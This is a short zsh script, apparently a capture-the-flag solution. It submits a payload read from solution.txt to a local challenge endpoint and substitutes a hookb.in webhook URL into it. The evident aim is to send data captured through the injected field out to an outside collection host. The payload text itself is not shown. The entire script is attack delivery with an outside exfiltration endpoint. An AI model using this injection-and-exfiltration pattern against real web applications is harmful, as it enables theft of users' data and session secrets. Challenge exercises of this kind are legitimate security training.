#! /usr/bin/env zsh

curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat solution.txt | sed 's;YOUR_URL_HERE;https://hookb.in/Px6LyylnaMcLaaWDMdBw;g')" -X POST http://localhost:1337/submit